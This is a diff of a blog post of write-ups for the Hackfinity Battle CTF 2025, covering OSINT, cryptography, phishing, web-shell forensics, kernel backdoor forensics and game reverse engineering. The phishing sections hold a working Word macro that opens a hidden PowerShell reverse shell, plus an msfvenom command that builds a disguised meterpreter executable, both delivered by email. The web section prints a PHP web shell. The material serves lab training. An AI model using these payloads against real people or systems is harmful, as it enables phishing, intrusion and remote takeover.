@@ -70,7 +70,7 @@
         <span>by</span>
         <span itemscope="" itemprop="author" itemtype="https://schema.org/Person">
             <span itemprop="name">
-                <a href="#" itemprop="url" rel="author">Reber</a>
+                <a href="#" itemprop="url" rel="author">[Reber Ghostzao]</a>
             </span>
         </span>
     </p>
@@ -80,30 +80,342 @@
         <div class="post-content clearfix" itemprop="articleBody">
     
 
-    <h2 id="hackfinity-battle-ctf-2025-writeups">Hackfinity Battle CTF 2025 Writeups</h2>
-<p>This document contains writeups for the challenges from the Hackfinity Battle CTF 2025.</p>
-<h2 id="catch-me-if-you-can">Catch Me If You Can</h2>
-<h3 id="challenge">Challenge</h3>
+    <h2 id="table-of-contents">Table of Contents</h2>
+<ul>
+<li><a href="#table-of-contents">Table of Contents</a>
+<ul>
+<li><a href="#osint-challenges">OSINT Challenges</a>
+<ul>
+<li><a href="#catch-me-if-you-can">Catch Me If You Can</a>
+<ul>
+<li><a href="#challenge">Challenge</a></li>
+<li><a href="#solution">Solution</a></li>
+</ul>
+</li>
+<li><a href="#catch-me-if-you-can-3">Catch Me If You Can 3</a>
+<ul>
+<li><a href="#challenge-1">Challenge</a></li>
+<li><a href="#solution-1">Solution</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#cryptography-challenges">Cryptography Challenges</a>
+<ul>
+<li><a href="#dark-matter">Dark Matter</a>
+<ul>
+<li><a href="#challenge-2">Challenge</a></li>
+<li><a href="#solution-2">Solution</a></li>
+</ul>
+</li>
+<li><a href="#order">Order</a>
+<ul>
+<li><a href="#challenge-3">Challenge</a></li>
+<li><a href="#solution-3">Solution</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#red-teaming-challenges">Red Teaming Challenges</a>
+<ul>
+<li><a href="#ghost-phishing">Ghost Phishing</a>
+<ul>
+<li><a href="#challenge-4">Challenge</a></li>
+<li><a href="#solution-4">Solution</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#shadow-phishing">Shadow Phishing</a>
+<ul>
+<li><a href="#challenge-5">Challenge</a></li>
+<li><a href="#solution-5">Solution</a></li>
+</ul>
+</li>
+<li><a href="#web-exploitation-challenges">Web Exploitation Challenges</a>
+<ul>
+<li><a href="#infinity-shell">Infinity Shell</a>
+<ul>
+<li><a href="#challenge-6">Challenge</a></li>
+<li><a href="#solution-6">Solution</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#forensics-challenges">Forensics Challenges</a>
+<ul>
+<li><a href="#sneaky-patch">Sneaky Patch</a>
+<ul>
+<li><a href="#challenge-7">Challenge</a></li>
+<li><a href="#solution-7">Solution</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#reverse-engineering-challenges">Reverse Engineering Challenges</a>
+<ul>
+<li><a href="#the-game">The Game</a>
+<ul>
+<li><a href="#challenge-8">Challenge</a></li>
+<li><a href="#solution-8">Solution</a></li>
+</ul>
+</li>
+<li><a href="#the-game-v2">The Game v2</a>
+<ul>
+<li><a href="#challenge-9">Challenge</a></li>
+<li><a href="#solution-9">Solution</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="osint-challenges">OSINT Challenges</h3>
+<h4 id="catch-me-if-you-can">Catch Me If You Can</h4>
+<h5 id="challenge">Challenge</h5>
 <p>Thanks to Void&rsquo;s l33t hacking skills, we obtained some CCTV footage from 2022 that might help us track Cipher&rsquo;s location. Our intel tells us that the individual caught on the CCTV footage that day was one of Cipher&rsquo;s accomplices. They were planning to meet up at one of Cipher&rsquo;s safe houses.
 We have this image of Cipher&rsquo;s accomplice, Phicer, leaving a restaurant.
 Can you and Specter find the name of the burger restaurant?</p>
 <p>Flag format: <strong>THM{restaurant_name}</strong>, separate words with underscores, and no capital letters .</p>
 <p>For example: <strong>THM{the_best_pizza}</strong>.</p>
 <p>It is also provided the CCTV image.</p>
-<p><img src="https://github.com/r4p3cks/hackfinity-battle-ctf-2025/blob/main/Catch%20Me%20If%20You%20Can/assets/Beco-OSINT-1741020774699.png" alt="CCTV-Image"></p>
-<h3 id="solution">Solution</h3>
+<p><img src="/blog/static/hackfinity-battle-ctf-2025/CatchMeIfYouCan/beco_osint.png" alt="CCTV-Image"></p>
+<h5 id="solution">Solution</h5>
 <p>Investigating the image, we can find a plate saying &ldquo;Beco do Batman&rdquo;.</p>
-<p><img src="https://github.com/user-attachments/assets/8a991745-f815-4bac-8e6b-ebc9cb08312a" alt="image"></p>
+<p><img src="/blog/static/hackfinity-battle-ctf-2025/CatchMeIfYouCan/beco_do_batman.png" alt="image"></p>
 <p>With google maps help, we can search Beco do Batman and get a location in Sao Paulo.</p>
-<p><img src="https://github.com/user-attachments/assets/adb02983-6495-4746-9103-e0565331412c" alt="image"></p>
+<p><img src="/blog/static/hackfinity-battle-ctf-2025/CatchMeIfYouCan/google_maps.png" alt="image"></p>
 <p>With a little search, we found that this is the exact location and the burger restaurant mentioned.</p>
-<p><img src="https://github.com/user-attachments/assets/19dd7a73-746e-4846-861b-ced7f61ee02b" alt="image"></p>
-<p><img src="https://github.com/user-attachments/assets/7c7d24a0-2ae9-4e79-83eb-736fdcbd9364" alt="image"></p>
+<p><img src="/blog/static/hackfinity-battle-ctf-2025/CatchMeIfYouCan/google_maps2.png" alt="image"></p>
+<p><img src="/blog/static/hackfinity-battle-ctf-2025/CatchMeIfYouCan/google_maps3.png" alt="image"></p>
 <p>The requested restaurant is Coringa do Beco!</p>
+<h4 id="catch-me-if-you-can-3">Catch Me If You Can 3</h4>
+<h5 id="challenge-1">Challenge</h5>
+<p>Unfortunately, we were unable to recover any more CCTV footage. Just as we were losing hope, Void clutched again and managed to crack the encryption on a message we recovered, sent from Cipher to Phicer in 2022:</p>
+<blockquote>
+<p>Meet me at the Mr.Wok safe house</p></blockquote>
+<p>Can you find the full address of their safe house?</p>
+<p>Flag format: <strong>THM{streetnumber_street_name}</strong> , no capitals and no special symbols.</p>
+<p>For example: If the address is 24 Rua Pablo Antonio, the flag would be <strong>THM{23_pablo_antonio}</strong>.</p>
+<h5 id="solution-1">Solution</h5>
+<p>Following the other challenges, this safe house must be in the same region, Sao Paulo. We searched the internet for &ldquo;Mr Wok sao paulo&rdquo;. The first result fitted well for what we were looking for. The address is <strong><em>Rua Galvão Bueno, 83, São Paulo, BR 01506-000</em></strong>.</p>
+<p><img src="/blog/static/hackfinity-battle-ctf-2025/CatchMeIfYouCan3/search_cmiyc3.png" alt="image"></p>
+<h3 id="cryptography-challenges">Cryptography Challenges</h3>
+<h4 id="dark-matter">Dark Matter</h4>
+<h5 id="challenge-2">Challenge</h5>
+<p>The Hackfinitiy high school has been hit by DarkInjector&rsquo;s ransomware, and some of its critical files have been encrypted. We need you and Void to use your crypto skills to find the RSA private key and restore the files.
+After some research and reverse engineering, you discover they have forgotten to remove some debugging from their code. The ransomware saves this data to the tmp directory.</p>
+<p>Can you find the RSA private key?</p>
+<blockquote>
+<p>It is provided a VM with the necessary!</p></blockquote>
+<p>Starting the provided VM, it is prompted the following:</p>
+<p><img src="/blog/static/hackfinity-battle-ctf-2025/DarkMatter/ransomware.png" alt="image"></p>
+<h5 id="solution-2">Solution</h5>
+<p>It is said that the tmp directory was used to save data from the debugging of the ransomware. This is what tmp contains:</p>
+<p><img src="/blog/static/hackfinity-battle-ctf-2025/DarkMatter/folders.png" alt="image"></p>
+<p>At first glance, the files that look promising are <strong><em>encrypted_aes_key.bin</em></strong> and <strong><em>public_key.txt</em></strong>. As said in the challenge statement, we need to find the RSA private key, so we can exclude the <strong><em>encrypted_aes_key.bin</em></strong>. Opening the <strong><em>public_key.txt</em></strong>
+we can confirm that this key is a RSA public key because of the <em>n</em> and <em>e</em>.</p>
+<p><img src="/blog/static/hackfinity-battle-ctf-2025/DarkMatter/key_info.png" alt="image"></p>
+<blockquote>
+<p>This <em>n</em> is called the modulus and is calculated by <em>p * q</em> (Two large prime numbers that are kept secret) operation.
+The public exponent, is typically a small prime number chosen to be relatively prime to (p−1)(q−1).
+What we want is <em>d</em> the private exponent, calculated as:
+<img src="/blog/static/hackfinity-battle-ctf-2025/DarkMatter/dformula.png" alt="image"></p></blockquote>
+<p>So if we obtain <em>p</em> and <em>q</em> we can obtain <em>d</em> (private key). If <em>n</em> is a small number, it is computationally feasible to factorize it and obtain p and q, which it is. We used a online number facotrizer to be more fast in the process, rather than doing a python script.
+We used this site (<a href="https://www.numberempire.com/numberfactorizer.php">Number Empire Number Factorizer</a>).</p>
+<p>The p and q are the following numbers:</p>
+<p><img src="/blog/static/hackfinity-battle-ctf-2025/DarkMatter/NumberFactorizer.png" alt="image"></p>
+<p>Calculating <em>d</em> with what we have, we obtain <strong>196442361873243903843228745541797845217</strong>. This number is the private key. When used in thee ransomware note the files are decrypted with success.</p>
+<p><img src="/blog/static/hackfinity-battle-ctf-2025/DarkMatter/ransomwaredecryption.png" alt="image"></p>
+<p>The key is in the <strong><em>student_grades.docx</em></strong> document.</p>
+<p><img src="/blog/static/hackfinity-battle-ctf-2025/DarkMatter/flag.png" alt="image"></p>
+<h4 id="order">Order</h4>
+<h5 id="challenge-3">Challenge</h5>
+<p>We intercepted one of Cipher&rsquo;s messages containing their next target. They encrypted their message using a repeating-key XOR cipher. However, they made a critical error—every message always starts with the header:</p>
+<blockquote>
+<p>ORDER:</p></blockquote>
+<p>Can you help void decrypt the message and determine their next target?
+Here is the message we intercepted:</p>
+<blockquote>
+<p>1c1c01041963730f31352a3a386e24356b3d32392b6f6b0d323c22243f63731a0d0c302d3b2b1a292a3a38282c2f222d2a112d282c31202d2d2e24352e60</p></blockquote>
+<h5 id="solution-3">Solution</h5>
+<p>The challenge explicitly indicates that the message used repeating-key XOR cipher and every message always start with the header <strong><em>ORDER:</em></strong>.</p>
+<blockquote>
+<p>A repeating-key XOR cipher is a type of encryption that uses a key that is repeated to match the length of the plaintext. Each character of the plaintext is XORed with the corresponding character of the key, making it a symmetric encryption method where the same process is used for both encryption and decryption.</p></blockquote>
+<p>If every message starts with header <strong><em>ORDER:</em></strong> we can find the first characters in the intercepted message (Because of the XOR). Using an online encrypter and decrypter (<a href="https://md5decrypt.net/en/Xor/">md5decrypt.net/en/Xor/</a>), we managed to find the following:</p>
+<p><img src="/blog/static/hackfinity-battle-ctf-2025/Order/firstdec.png" alt="image"></p>
+<p>This indicates that <strong><em>SNEAKY</em></strong> was the key used to encrypt the message. So repeating the process but this time with SNEAKY as the key we can decrypt the message.</p>
+<p><img src="/blog/static/hackfinity-battle-ctf-2025/Order/seconddec.png" alt="image"></p>
+<h3 id="red-teaming-challenges">Red Teaming Challenges</h3>
+<h4 id="ghost-phishing">Ghost Phishing</h4>
+<h5 id="challenge-4">Challenge</h5>
+<p>We have successfully gained access to DarkSpecter&rsquo;s email, and this leak contains a direct connection to Cipher&rsquo;s latest operations.
+Within the encrypted exchanges are invaluable intelligence: Information on recent attacks, compromised systems, and which might be the next target.
+This could be our best chance to forecast Cipher&rsquo;s next move and dismantle his network once and for all.</p>
+<p><strong>Username:</strong> <a href="mailto:specter@darknetmail.corp">specter@darknetmail.corp</a>
+<strong>Password:</strong> YouCantCatchMe</p>
+<h5 id="solution-4">Solution</h5>
+<p>When opened the DarkSpecter&rsquo;s email we are faced with the following:</p>
+<p><img src="/blog/static/hackfinity-battle-ctf-2025/GhostPhishing/firstemail.png" alt="image"></p>
+<p>So the first thing we did was send an simple document (txt) with a attack report and asking for a password to see what cipher responds. The response was this:</p>
+<p><img src="/blog/static/hackfinity-battle-ctf-2025/GhostPhishing/secondemail.png" alt="image"></p>
+<p>After multiple tries, we search a bit about what could be done with docx and docm documents. We found that it is possible, using macros, do a reverse shell.
+Basically, when cipher opens the document, it will run a piece of code that will connect to our machine. For this we need to activate the macros in Word.</p>
+<blockquote>
+<p>File -&gt; Options -&gt; Customize Ribbon -&gt; Enable Developer Options in the Right Pane.
+After this, we need to create our macro code. The code is the following:</p></blockquote>
+<pre tabindex="0"><code class="language-vba" data-lang="vba">Sub AutoOpen()
+MyMacro
+End Sub
+
+Sub Document_Open()
+MyMacro
+End Sub
+
+Sub MyMacro()
+Dim Str As String
+Str = &#34;powershell -nop -w hidden -noni -c &#34;&#34;$client = New-Object System.Net.Sockets.TCPClient(&#39;&lt;LHOST&gt;&#39;,&lt;LPORT&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&#34;&#34;&#34;
+CreateObject(&#34;Wscript.Shell&#34;).Run Str
+End Sub
+</code></pre><p>Where it is <code>LHOST</code> and <code>LPORT</code> we put our local ip and port.
+Now for the macro work we need to do the following thing:</p>
+<ul>
+<li>Go to Developer on the menu above and select Macros.</li>
+<li>We need to make sure that we are creating the macro in the document we want to send. (We were struggling a bit because we were saving in other location and, because of that, we weren&rsquo;t managing to get a reverse shell ;( )
+<img src="/blog/static/hackfinity-battle-ctf-2025/GhostPhishing/macros.png" alt="image"></li>
+<li>Click in create and copy and paste the code above and save.
+<img src="/blog/static/hackfinity-battle-ctf-2025/GhostPhishing/macros2.png" alt="image"></li>
+<li>After this close the window and save the document.</li>
+</ul>
+<p>After this we have our macro ready to go. We send the email with the document attached and wait for cipher make this mistake of opening it. Before sending it we need to set up a listener in our machine.
+Using ncat for that:</p>
+<p><img src="/blog/static/hackfinity-battle-ctf-2025/GhostPhishing/ncat.png" alt="image"></p>
+<p>Finally, we send the document in the attachments and wait for the connection.</p>
+<p><img src="/blog/static/hackfinity-battle-ctf-2025/GhostPhishing/thirdemail.png" alt="image"></p>
+<p>Now the easy part, search for the flag. It is said that we need the Administrator flag. So we looked in Administrator user and found the flag in the Desktop directory.</p>
+<p><img src="/blog/static/hackfinity-battle-ctf-2025/GhostPhishing/remoteaccess.png" alt="image"></p>
+<h3 id="shadow-phishing">Shadow Phishing</h3>
+<h4 id="challenge-5">Challenge</h4>
+<p>We gained access to the email account of ShadowByte, one of Cipher&rsquo;s trusted operatives.
+This breakthrough will help bring Cipher&rsquo;s location closer to light and foil his plans for the apocalyptic cyber weapon.
+The clock is ticking, though too much time and Cipher will know something is wrong and again disappear into the depths of the darknet.  The race against time goes on.</p>
+<p><strong>Username:</strong> <a href="mailto:shadowbyte@darknetmail.corp">mailto:shadowbyte@darknetmail.corp</a></p>
+<p><strong>Password:</strong> ShadowIsTheBest</p>
+<h4 id="solution-5">Solution</h4>
+<p>When accessing the ShadowByte email we see this email from Cipher:</p>
+<p><img src="/blog/static/hackfinity-battle-ctf-2025/ShadowPhishing/firstemail.png" alt="image"></p>
+<p>Cipher told ShadowByte that he needs a exe! Like Ghost Phishing challenge, we could create a reverse TCP shell windows executable. For this we used metasploit for a faster and easy way to create this.</p>
+<p>We used this command to generate our executable named silentEdgeInstaller.exe to match what Cipher wanted:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>10.23.56.134 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">8080</span> -f exe -o /home/thm/silentEdgeInstaller.exe
+</span></span></code></pre></div><p>After we went to the msfconsole and created our payload and started listenning for incoming connections.
+<img src="/blog/static/hackfinity-battle-ctf-2025/ShadowPhishing/metasploit.png" alt="image">
+<img src="/blog/static/hackfinity-battle-ctf-2025/ShadowPhishing/metasploit2.png" alt="image"></p>
+<p>After this we sent the executable to Cipher, replying to the email he sent. He didnt responded but we got the connection.</p>
+<p><img src="/blog/static/hackfinity-battle-ctf-2025/ShadowPhishing/access.png" alt="image"></p>
+<p>They want the Administrator flag. So we went to the Administrator desktop and found the flag!</p>
+<p><img src="/blog/static/hackfinity-battle-ctf-2025/ShadowPhishing/access2.png" alt="Untitled design"></p>
+<h3 id="web-exploitation-challenges">Web Exploitation Challenges</h3>
+<h4 id="infinity-shell">Infinity Shell</h4>
+<h5 id="challenge-6">Challenge</h5>
+<p>Cipher’s legion of bots has exploited a known vulnerability in our web application, leaving behind a dangerous web shell implant. Investigate the breach and trace the attacker&rsquo;s footsteps!</p>
+<h5 id="solution-6">Solution</h5>
+<p>It is said that the cipher&rsquo;s legion of bots left a dangerous web shell implant. Exploring the /var/www/html folder we found a shoulder containing the web application mentioned in the statement.</p>
+<p><img src="/blog/static/hackfinity-battle-ctf-2025/InfinityShell/folder.png" alt="image"></p>
+<p>This site, probably contained some kind of field to insert files without checking them. Probably, cipher abused this&hellip; We checked the img folder and found a suspicious file called images.php with following code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>(<span style="color:#a6e22e">base64_decode</span>($_GET[<span style="color:#e6db74">&#39;query&#39;</span>])); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>This file is weird. First is using system() function and is in the middle of the images. At the time we were clueless about this file, probably was being used by the site to get images, but using base64_decode was strange.</p>
+<p>After a bit of investigation, we found nothing. If the attacker uploaded a malicious file, he probably used it as a web shell. So we checked the logs. After a bit of searching we found the following:</p>
+<p><img src="/blog/static/hackfinity-battle-ctf-2025/InfinityShell/folder2.png" alt="image"></p>
+<p>We opened the last file in hope for access logs by this actors. And we found something!</p>
+<p><img src="/blog/static/hackfinity-battle-ctf-2025/InfinityShell/log.png" alt="Untitled design(1)"></p>
+<p>The line 81 looked promising. A string encoded in base64.</p>
+<pre tabindex="0"><code class="language-base64" data-lang="base64">ZWNoby---------------------------Gx9Jwo=
+</code></pre><p>Decoding it we can obtain the flag!</p>
+<p>Note: This could be done using cat and then filtering the entries and was much easier.</p>
+<h3 id="forensics-challenges">Forensics Challenges</h3>
+<h4 id="sneaky-patch">Sneaky Patch</h4>
+<h5 id="challenge-7">Challenge</h5>
+<p>A high-value system has been compromised. Security analysts have detected suspicious activity within the kernel, but the attacker’s presence remains hidden. Traditional detection tools have failed, and the intruder has established deep persistence. Investigate a live system suspected of running a kernel-level backdoor.</p>
+<p>It&rsquo;s provided a Machine to investigate</p>
+<h5 id="solution-7">Solution</h5>
+<p>From the description, we thought in starting searching in the kernel logs. Executing the command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo dmesg
+</span></span></code></pre></div><p>It was possible to watch some interesting things from the output:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>   26.371308<span style="color:#f92672">]</span> systemd-journald<span style="color:#f92672">[</span>132<span style="color:#f92672">]</span>: File /var/log/journal/dc7c8ac5c09a4bbfaf3d09d399f10d96/user-1000.journal corrupted or uncleanly shut down, renaming and replacing.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>   32.701060<span style="color:#f92672">]</span> spatch: loading out-of-tree module taints kernel.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>   32.701072<span style="color:#f92672">]</span> spatch: module verification failed: signature and/or required key missing - tainting kernel
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>   32.702610<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>CIPHER BACKDOOR<span style="color:#f92672">]</span> Module loaded. Write data to /proc/cipher_bd
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>   32.704977<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>CIPHER BACKDOOR<span style="color:#f92672">]</span> Executing command: id
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>   32.711742<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>CIPHER BACKDOOR<span style="color:#f92672">]</span> Command Output: uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>   41.059522<span style="color:#f92672">]</span> traps: mate-power-mana<span style="color:#f92672">[</span>1887<span style="color:#f92672">]</span> trap int3 ip:71d3aec050df sp:7fff1aa8dd40 error:0 in libglib-2.0.so.0.8000.0<span style="color:#f92672">[</span>71d3aebc1000+a0000<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>We can observe:</p>
+<ul>
+<li>Module &lsquo;spatch&rsquo; loaded, it&rsquo;s out-of-tree &amp; tainted, this proves that this module is not suppose to be in kernel.</li>
+<li>The backdoor exists ([CIPHER BACKDOOR]) and accepts commands though the /proc/cipher_bd archive.
+Let&rsquo;s find where this &lsquo;spatch&rsquo; is:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -type f -name <span style="color:#e6db74">&#39;spatch.ko&#39;</span> 2&gt;/dev/null
+</span></span></code></pre></div><p>Output:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/lib/modules/6.8.0-1016-aws/kernel/drivers/misc/spatch.ko
+</span></span></code></pre></div><p>After getting the path we search inside the module:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>strings /lib/modules/6.8.0-1016-aws/kernel/drivers/misc/spatch.ko | less
+</span></span></code></pre></div><p>Output:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>6<span style="color:#f92672">[</span>CIPHER BACKDOOR<span style="color:#f92672">]</span> Module loaded. Write data to /proc/%s
+</span></span><span style="display:flex;"><span>6<span style="color:#f92672">[</span>CIPHER BACKDOOR<span style="color:#f92672">]</span> Module unloaded.
+</span></span><span style="display:flex;"><span>3<span style="color:#f92672">[</span>CIPHER BACKDOOR<span style="color:#f92672">]</span> Failed to read output file
+</span></span><span style="display:flex;"><span>6<span style="color:#f92672">[</span>CIPHER BACKDOOR<span style="color:#f92672">]</span> Command Output: %s
+</span></span><span style="display:flex;"><span>3<span style="color:#f92672">[</span>CIPHER BACKDOOR<span style="color:#f92672">]</span> No output captured.
+</span></span><span style="display:flex;"><span>6<span style="color:#f92672">[</span>CIPHER BACKDOOR<span style="color:#f92672">]</span> Executing command: %s
+</span></span><span style="display:flex;"><span>3<span style="color:#f92672">[</span>CIPHER BACKDOOR<span style="color:#f92672">]</span> Failed to setup usermode helper.
+</span></span><span style="display:flex;"><span>6<span style="color:#f92672">[</span>CIPHER BACKDOOR<span style="color:#f92672">]</span> Format: echo <span style="color:#e6db74">&#34;COMMAND&#34;</span> &gt; /proc/cipher_bd
+</span></span><span style="display:flex;"><span>6<span style="color:#f92672">[</span>CIPHER BACKDOOR<span style="color:#f92672">]</span> Try: echo <span style="color:#e6db74">&#34;%s&#34;</span> &gt; /proc/cipher_bd
+</span></span><span style="display:flex;"><span>6<span style="color:#f92672">[</span>CIPHER BACKDOOR<span style="color:#f92672">]</span> Here<span style="color:#960050;background-color:#1e0010">&#39;</span>s the secret: 54484-----------------------------
+</span></span><span style="display:flex;"><span>PATH<span style="color:#f92672">=</span>/sbin:/bin:/usr/sbin:/usr/bin
+</span></span><span style="display:flex;"><span>description<span style="color:#f92672">=</span>Cipher is always root
+</span></span></code></pre></div><p>Interesting:</p>
+<p><strong>6[CIPHER BACKDOOR] Here&rsquo;s the secret: 54484&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;</strong></p>
+<p>Using CyberChef[https://cyberchef.org/] to convert the hash from hexa to text you get the flag: THM{&hellip;}</p>
+<h3 id="reverse-engineering-challenges">Reverse Engineering Challenges</h3>
+<h4 id="the-game">The Game</h4>
+<h5 id="challenge-8">Challenge</h5>
+<p>Cipher has gone dark, but intel reveals he’s hiding critical secrets inside Tetris, a popular video game. Hack it and uncover the encrypted data buried in its code.</p>
+<blockquote>
+<p>It is provided a zip with a executable inside it <a href="/blog/static/hackfinity-battle-ctf-2025/TheGame/Tetrix.exe-1741979048280.zip">Download_Tetrix.zip</a></p></blockquote>
+<h5 id="solution-8">Solution</h5>
+<p>This challenge was very easy. We extracted the zip and isolated the executable. With the program <em>strings</em> we found the flag.</p>
+<blockquote>
+<p>$ strings Tetrix.exe | grep THM</p></blockquote>
+<h4 id="the-game-v2">The Game v2</h4>
+<h5 id="challenge-9">Challenge</h5>
+<p>Cipher’s trail led us to a new version of Tetris hiding encrypted information. As we cracked its code, a chilling message emerged: &ldquo;The game is never over.&rdquo;</p>
+<blockquote>
+<p>It is provided a zip with a executable inside it <a href="/blog/static/hackfinity-battle-ctf-2025/TheGame2/TetrixFinalv2.exe-1742225230694.zip">Download_Tetrix_v2.zip</a></p></blockquote>
+<h5 id="solution-9">Solution</h5>
+<p>This challenge was harder than the v1 version of this. This time using <em>strings</em> was not possible to obtain the flag or any useful info.
+To gather more information we executed the game in a secure environment. We compared it to the version 1 and it was different. The most different thing was that the v2 has a string saying the following:</p>
+<p><img src="/blog/static/hackfinity-battle-ctf-2025/TheGame2/game.png" alt="image"></p>
+<p>This must be a hint to obtain the flag. It was time for some game hacking. We used cheat engine to be able to modified values in the process running the game. The first thing that we thought was to modified the score to a number higher to 999999.
+Unsuccessfully.</p>
+<p><img src="/blog/static/hackfinity-battle-ctf-2025/TheGame2/game2.png" alt="image"></p>
+<p>Five results, when searching for the score value. We tried to change every value of the five addresses. Nothing&hellip;</p>
+<p>If changing the score does nothing, what about changing the minimum score.</p>
+<p><img src="/blog/static/hackfinity-battle-ctf-2025/TheGame2/game3.png" alt="image"></p>
+<p>This looked promising, so we changed the value in the first address to 100. So if we scored 100 points maybe the program would show something. And it did.</p>
+<p><img src="/blog/static/hackfinity-battle-ctf-2025/TheGame2/game4.png" alt="image"></p>
 
 </div>
 
-        <footer class="post-footer clearfix"><div class="share">
+        <footer class="post-footer clearfix">
+        <p class="post-tags">
+            <span>Tagged:</span>
+                <a href="/tags/ctf/">ctf</a>, 
+                <a href="/tags/osint/">osint</a>, 
+                <a href="/tags/cryptography/">cryptography</a>, 
+                <a href="/tags/forensics/">forensics</a>
+        </p>
+    <div class="share">
     </div>
 </footer>
 
